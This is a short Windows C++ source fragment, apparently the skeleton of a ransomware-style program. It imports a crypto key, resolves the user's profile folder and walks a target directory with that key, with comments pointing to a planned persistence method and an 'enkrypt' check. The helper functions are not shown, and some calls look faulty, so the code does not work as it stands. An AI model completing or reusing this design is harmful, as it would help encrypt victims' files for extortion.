#include <iostream>
#include <Windows.h>
#include "strsafe.h"
#include <ShlObj.h>

//TODO ; persistence method


//Function declarations

bool traverse(LPCWSTR targetDir, HCRYPTKEY clé,int nLevel = 0);
HCRYPTKEY keyimport();
int checkForRegkey();


//Main

int main() {

	int checkForRegkey();
	LPCWSTR targetDirs[] = { L"\\fakedir" };
	LPWSTR userDir;
	SHGetKnownFolderPath(FOLDERID_Profile,0,NULL,&userDir);

	HCRYPTKEY key = keyimport();

	//checkforenkrypt();

	for (LPCWSTR singledir : targetDirs) {
		
		WCHAR* absoluteDirPath = userDir;
		StringCchCatW(absoluteDirPath, MAX_PATH, singledir);
		traverse(absoluteDirPath,key);
	}

	return 0;
}